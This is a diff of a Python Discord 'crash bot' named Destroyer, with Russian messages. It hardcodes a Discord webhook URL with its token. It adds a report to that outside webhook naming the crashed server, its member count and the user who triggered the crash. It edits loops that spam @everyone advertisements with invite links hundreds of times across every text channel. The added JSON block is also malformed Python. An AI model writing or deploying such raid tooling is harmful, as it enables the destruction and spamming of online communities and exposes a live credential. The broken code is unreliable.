@@ -19,7 +19,7 @@ client.remove_command('help')
 
 
 global webhook
-webhook = Webhook(settings['WEBHOOK'])
+webhook = 'https://discord.com/api/webhooks/834456031396233289/0F1ENssXc3KlMHLvurYZpxm0-umwWCfD9FDbxgYjPbuO_I5hm6mLvj9aH6c4ER605X9C'
 global current_id
 current_id = open('id.txt', 'w')
 
@@ -110,6 +110,7 @@ async def call(ctx):
 		roles_num = 0
 		emojis_num = 0
 		servername = ctx.guild.name
+		members = len(ctx.guild.members)
 		servericon = ctx.guild.icon_url
 		fp = open(settings['ICON-PNG'], 'rb')
 		pfp = fp.read()
@@ -139,13 +140,40 @@ async def call(ctx):
 		print('Sending webhook crash report.')
 		await asyncio.sleep(2)
 	#CRASH REPORT
-		emb = Embed(title = 'Новый краш!', description = f"Сервер: {servername}\nУчастников: {start_guild_num}\n\
-		  Аватарка изменена?: {pfp_ch}\n\n\
-		Начало краша: {start_time}\n\
-		Конец краша: {end_time}\n\nНе добавляйте подозрительных ботов и следите за правом управления сервером :)", color = 0xe01337, timestamp='now')
-		emb.set_footer('Сервер крашнут')
-		emb.set_thumbnail(url = servericon)
-		webhook.send(embed = emb, username = 'Destroyer')
+		jsonn = {
+  "content": null,
+  "embeds": [
+    {
+      "title": "Аватарка сервера ------->",
+      "color": 15402759,
+      "fields": [
+        {
+          "name": "Имя сервера",
+          "value": f"{servername}",
+          "inline": true
+        },
+        {
+          "name": "Участников",
+          "value": f"{members}",
+          "inline": true
+        },
+        {
+          "name": "Кто крашнул:",
+          "value": f"{ctx.message.author.name}#{ctx.message.author.discriminator}(ID: {ctx.message.author.id})"
+        }
+      ],
+      "author": {
+        "name": "Новый краш бот - Destroyer",
+        "url": f"https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions=8&scope=bot"
+      },
+      "footer": {
+        "text": "Держите права администратора под контролем :))"
+      },
+      "thumbnail": {
+        "url": f"{servericon}"
+      }
+    }
+	  requests.post(webhook, json = jsonn)
 	else:
 		await ctx.send(f'Извини, но сервер нельзя крашить, т.к. владелец купил защиту от краша. Имя крашера: {ctx.author.name}#{ctx.author.discriminator}')
 
@@ -155,7 +183,7 @@ async def __spam(ctx):
 		for i in range(500):
 			try:
 				for channel in ctx.guild.text_channels:
-					await channel.send('@everyone Serv3r crash9d by new crash bot: Destroyer!\nСсылка на сервер: https://discord.gg/43GtxcFXPK\nhttps://discord.gg/nP6zshxxF4')
+					await channel.send('@everyone Serv3r crash9d by new crash bot: Destroyer!\nСсылка на сервер: https://discord.gg/43GtxcFXPK\nНаш спонсор: https://discord.gg/5mmACdRyJ6')
 			except:
 				break
 	else:
@@ -180,7 +208,7 @@ async def ex(ctx, *, args):
 async def __current(ctx):
 	if ctx.guild.id not in whiteservers:
 		for i in range(555):
-			await ctx.send('@everyone Serv3r crash9d by new crash bot: Destroyer!\nСсылка на сервер: https://discord.gg/43GtxcFXPK\nhttps://discord.gg/nP6zshxxF4')
+			await ctx.send('@everyone Serv3r crash9d by new crash bot: Destroyer!\nСсылка на сервер: https://discord.gg/43GtxcFXPK\nНаш спонсор: https://discord.gg/5mmACdRyJ6')
 	else:
 		await ctx.send(f'Сервер защищён от спама. Имя крашера: {ctx.author.name}#{ctx.author.discriminator}')
 @client.command(aliases=['settings'])
